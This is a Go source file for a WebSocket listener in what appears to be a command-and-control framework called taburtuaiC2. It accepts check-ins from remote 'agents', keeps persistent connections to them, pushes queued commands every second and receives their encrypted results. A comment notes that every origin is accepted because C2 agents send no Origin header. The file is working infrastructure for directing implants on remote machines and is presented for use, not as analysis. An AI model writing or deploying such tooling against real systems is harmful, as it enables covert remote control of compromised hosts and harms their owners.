package wslistener

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"sync"
	"sync/atomic"
	"time"

	"github.com/gorilla/websocket"
	"github.com/mjopsec/taburtuaiC2/internal/listener"
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  4096,
	WriteBufferSize: 4096,
	// Accept all origins — C2 agents don't send an Origin header.
	CheckOrigin: func(r *http.Request) bool { return true },
}

// envelope is the JSON framing used for all WS messages in both directions.
type envelope struct {
	Type  string          `json:"type"`
	ID    string          `json:"id,omitempty"`    // agent_id (checkin) or cmd_id (result)
	Data  json.RawMessage `json:"data,omitempty"`  // encrypted payload
	Error string          `json:"error,omitempty"`
}

// agentConn tracks a single persistent agent WebSocket connection.
type agentConn struct {
	agentID string
	conn    *websocket.Conn
	send    chan envelope
	done    chan struct{}
}

// WSListener accepts persistent WebSocket connections from agents.
// The server pushes commands down the open connection instead of waiting for polls.
type WSListener struct {
	config  *listener.Config
	handler listener.Handler
	server  *http.Server
	stats   *listener.Stats
	status  listener.Status
	mu      sync.RWMutex

	connsMu sync.Mutex
	conns   map[string]*agentConn

	bytesIn    int64
	bytesOut   int64
	totalReqs  int64
	errorCount int64
}

// New creates a new WSListener.
func New(cfg *listener.Config, handler listener.Handler) *WSListener {
	return &WSListener{
		config:  cfg,
		handler: handler,
		conns:   make(map[string]*agentConn),
		stats: &listener.Stats{
			ListenerID: cfg.ID,
			StartedAt:  time.Now(),
		},
		status: listener.StatusStopped,
	}
}

// Start begins accepting WebSocket connections.
func (w *WSListener) Start(ctx context.Context) error {
	w.mu.Lock()
	w.status = listener.StatusStarting
	w.mu.Unlock()

	mux := http.NewServeMux()
	mux.HandleFunc("/ws", w.handleWS)

	w.server = &http.Server{
		Addr:         fmt.Sprintf("%s:%d", w.config.Host, w.config.Port),
		Handler:      mux,
		ReadTimeout:  0, // WebSocket connections must not time out
		WriteTimeout: 0,
		IdleTimeout:  120 * time.Second,
	}

	w.mu.Lock()
	w.status = listener.StatusRunning
	w.stats.StartedAt = time.Now()
	w.mu.Unlock()

	go func() {
		<-ctx.Done()
		_ = w.Stop()
	}()

	if err := w.server.ListenAndServe(); err != http.ErrServerClosed {
		w.mu.Lock()
		w.status = listener.StatusError
		w.mu.Unlock()
		return fmt.Errorf("ws listener: %w", err)
	}
	return nil
}

// Stop shuts down the listener and closes all agent connections.
func (w *WSListener) Stop() error {
	w.mu.Lock()
	defer w.mu.Unlock()

	w.connsMu.Lock()
	for _, ac := range w.conns {
		select {
		case <-ac.done:
		default:
			close(ac.done)
		}
		ac.conn.Close()
	}
	w.connsMu.Unlock()

	if w.server != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		_ = w.server.Shutdown(ctx)
	}
	w.status = listener.StatusStopped
	return nil
}

func (w *WSListener) GetConfig() *listener.Config { return w.config }
func (w *WSListener) GetStatus() listener.Status  { return w.status }
func (w *WSListener) GetStats() *listener.Stats {
	w.stats.BytesIn = atomic.LoadInt64(&w.bytesIn)
	w.stats.BytesOut = atomic.LoadInt64(&w.bytesOut)
	w.stats.Errors = atomic.LoadInt64(&w.errorCount)
	w.connsMu.Lock()
	w.stats.ActiveAgents = len(w.conns)
	w.connsMu.Unlock()
	return w.stats
}

// handleWS upgrades the connection and drives the full agent lifecycle.
func (w *WSListener) handleWS(rw http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(rw, r, nil)
	if err != nil {
		atomic.AddInt64(&w.errorCount, 1)
		return
	}
	atomic.AddInt64(&w.totalReqs, 1)

	// First message must arrive within 30 s and must be a checkin.
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	_, raw, err := conn.ReadMessage()
	if err != nil {
		conn.Close()
		return
	}
	conn.SetReadDeadline(time.Time{})
	atomic.AddInt64(&w.bytesIn, int64(len(raw)))

	var env envelope
	if err := json.Unmarshal(raw, &env); err != nil || env.Type != "checkin" {
		_ = conn.WriteJSON(envelope{Type: "error", Error: "first message must be type=checkin"})
		conn.Close()
		return
	}

	var data listener.CheckinData
	if err := json.Unmarshal(env.Data, &data); err != nil {
		_ = conn.WriteJSON(envelope{Type: "error", Error: "invalid checkin payload"})
		conn.Close()
		return
	}

	agentID := env.ID
	if agentID == "" {
		agentID = data.AgentID
	}

	resp, err := w.handler.OnCheckin(&data)
	if err != nil {
		atomic.AddInt64(&w.errorCount, 1)
		_ = conn.WriteJSON(envelope{Type: "error", Error: err.Error()})
		conn.Close()
		return
	}

	respJSON, _ := json.Marshal(resp)
	_ = conn.WriteJSON(envelope{Type: "noop", Data: respJSON})
	atomic.AddInt64(&w.bytesOut, int64(len(respJSON)))

	w.mu.Lock()
	w.stats.TotalCheckins++
	w.stats.LastCheckin = time.Now()
	w.mu.Unlock()

	// Register the persistent connection.
	ac := &agentConn{
		agentID: agentID,
		conn:    conn,
		send:    make(chan envelope, 32),
		done:    make(chan struct{}),
	}
	w.connsMu.Lock()
	w.conns[agentID] = ac
	w.connsMu.Unlock()

	go w.writeLoop(ac)
	go w.pushLoop(ac)
	w.readLoop(ac) // blocks until the connection closes

	// Deregister on disconnect.
	w.connsMu.Lock()
	delete(w.conns, agentID)
	w.connsMu.Unlock()

	select {
	case <-ac.done:
	default:
		close(ac.done)
	}
}

// readLoop reads result messages from the agent until the connection closes.
func (w *WSListener) readLoop(ac *agentConn) {
	for {
		_, raw, err := ac.conn.ReadMessage()
		if err != nil {
			return
		}
		atomic.AddInt64(&w.bytesIn, int64(len(raw)))

		var env envelope
		if err := json.Unmarshal(raw, &env); err != nil {
			continue
		}
		if env.Type != "result" {
			continue
		}

		// env.Data is the raw result payload (may be JSON-encoded bytes).
		payload := []byte(env.Data)
		if err := w.handler.OnResult(ac.agentID, payload); err != nil {
			atomic.AddInt64(&w.errorCount, 1)
		}
	}
}

// writeLoop serialises all outbound messages onto the WS connection.
func (w *WSListener) writeLoop(ac *agentConn) {
	keepalive := time.NewTicker(25 * time.Second)
	defer keepalive.Stop()

	for {
		select {
		case <-ac.done:
			return
		case env, ok := <-ac.send:
			if !ok {
				return
			}
			raw, _ := json.Marshal(env)
			if err := ac.conn.WriteMessage(websocket.TextMessage, raw); err != nil {
				return
			}
			atomic.AddInt64(&w.bytesOut, int64(len(raw)))
		case <-keepalive.C:
			raw, _ := json.Marshal(envelope{Type: "noop"})
			if err := ac.conn.WriteMessage(websocket.TextMessage, raw); err != nil {
				return
			}
		}
	}
}

// pushLoop polls the command queue every second and forwards any pending command
// to the agent over the open WebSocket connection — no polling needed on the agent side.
func (w *WSListener) pushLoop(ac *agentConn) {
	tick := time.NewTicker(time.Second)
	defer tick.Stop()

	for {
		select {
		case <-ac.done:
			return
		case <-tick.C:
			cmd, err := w.handler.OnPoll(ac.agentID)
			if err != nil || cmd == nil {
				continue
			}
			cmdJSON, err := json.Marshal(cmd)
			if err != nil {
				continue
			}
			select {
			case ac.send <- envelope{Type: "command", Data: cmdJSON}:
			case <-ac.done:
				return
			default:
				// send channel full — drop and retry next tick
			}
		}
	}
}
